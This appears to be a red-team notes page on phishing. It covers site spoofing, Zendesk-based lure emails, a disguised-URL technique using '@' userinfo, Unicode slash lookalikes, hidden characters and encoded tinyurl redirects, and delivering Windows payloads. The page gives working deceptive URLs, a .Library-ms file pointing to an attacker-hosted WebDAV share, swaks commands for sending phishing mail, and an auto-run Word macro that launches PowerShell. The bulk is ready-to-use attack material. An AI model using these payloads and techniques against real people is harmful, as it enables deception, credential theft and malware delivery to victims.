---
layout: blank
pagetitle: Phishing
---

## Phishing Pages

**Spoofing a site**
- [SingleFile](https://chromewebstore.google.com/detail/singlefile/mpiodijhokgodhhofbcjdecpffjipkle?hl=en) is good for downloading pages to spoof
  - Make sure preferences don't include JavaScript
  - Strip out SingleFile comment (near top) along with anything with an "sf" prefix and links to the original site
- If we get hit with Azure/O365, try using [OAuthSeeker](https://github.com/praetorian-inc/oauthseeker/)

**Zendesk**
- You can get a domain on Zendesk.com to send emails from
- Zendesk also has IT stuff, so you can make a ticket and assign it to a user
  - This will send them an email with the ticket information, which we can use to have them click a link

## Fake Arbitrary Redirect

**Techniques**
- Uses `@` character to tell the browser that everything before the `@` is simply authentication for the following page (an encoded tinyurl site) - I didn't find an arbitrary redirect on github
	- You can't use the `@` technique after a domain AND path have been specified, so specify fake paths using a `/` Unicode lookalike: `∕` (effectively making the TLD in the domain very very long)
	- This lookalike character is a unicode division slash without any numbers (think ⅓)
- You can actually URL encode every single character in a link except for the `/`, so the entire tinyurl link is encoded
- `&` can actually be included without encoding in the authentication information (prior to the `@`), so I included bogus URL parameters from an amazon product link to make it look more realistic (hiding the URL encoded link within)
- For google meets, a link starting with a valid URL (e.g. https://github.com) will be underlined, so I included some hidden unicode characters to break the link

**Broken down**
- `https://` - start of URL
- `U+E0001 U+E0020 U+E007F` - hidden Unicode characters to break link underlining functionality in Google meets
- Used https://embracethered.com/blog/ascii-smuggler.html to encode ` `
- `󠁿github.com` - normal github domain
- `∕praetorian-inc∕Cerebrum∕tree∕main∕Personal%20Spaces∕khael.kugler` - realistic path using fake `∕` character
- `&diff=%75%6E%69%66%69%65%64&uuid=259d9f6c-ea4f-492b-a741-8ca016e53a70&ref=main_1598392` - fake URL parameters used to hide the actual payload
- `@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%33%39%74%7A%72%6A%79%6A` - payload decoding to `tinyurl.com/39tzrjyj`, starting with `@`
- `#&whitespace=ignore&inline=false&workflow=ci-deploy-container-ghcr-ref-main` - more fake parameters, starting with a `#` to not confuse tinyurl's redirection


- When emailing, choose a font that looks good. Menlo is alright, but a bit too code-related

Final payload: `https://󠀁󠀠󠁿github.com∕praetorian-inc∕Cerebrum∕tree∕main∕Personal%20Spaces∕khael.kugler&diff=%75%6E%69%66%69%65%64&uuid=259d9f6c-ea4f-492b-a741-8ca016e53a70&ref=main_1598392@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%33%39%74%7A%72%6A%79%6A#&whitespace=ignore&inline=false&workflow=ci-deploy-container-ghcr-ref-main`

Other example payloads:
`https://github.com∕praetorian-inc∕noseyparker∕releases∕download∕v0.23.0∕secret-noseyparker-v0.23.0-aarch64-apple-darwin.tar.gz&conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32/&96298722-d186-4e28-b5e9-2ca14f49d977=1`

`https://www.amazon.com∕gp∕product∕B008A0GNA8pr=conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6TT&plattr=mathplace=priceblockimp@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32?=96298722-d186-4e28-b5e9-2ca14f49d977`

- Can also sort of be used to bypass URL validation
  - Portswigger URL bypass techniques: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

## Windows 
- Can't send malware directly by email, so we need to get them to download the spreadsheet with macros from a link
  - Also need to "blur" the spreadsheet so victim clicks "Enable Editing" to allow macros
  - Avoid Mark of the Web (MOTW) by putting malware inside 7zip, ISO, IMG
- Windows library files are less well-known and can be equally effective for hosting files
- Executing `.Library-ms` file into executing `.lnk` file
- These files display remote directories like local directories, where we put .lnk file
	- `pip3 install wsgidav` for a WebDAV server to host/serve files
	- usage: `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root {directory}`  
- config.Library-ms file contents:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://{kali_IP}</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Sending a phishing email with the share:
	- `sudo swaks -t {to_email} -t {to_email} --from {from_email} --attach @config.Library-ms --server {mail_server} --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
- Using SMTP with `swaks`:
  - To use an SMTP server, we need a user whose credentials we know on the domain `swaks --server {IP_with_SMTP} --body @{body_txt_file} -ap --from {user@domain} --to {target@domain} --auth-user {user@domain} --auth-password {password} --attach @{file_to_attach} --header "{header_text}"`

## Misc

**Docx Word Macro**
- To make a Word macro that runs on document open, the following will work at a basic level:

```Powershell
Sub AutoOpen()

  MyMacro

End Sub
Sub Document_Open()

  MyMacro

End Sub
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"

End Sub
```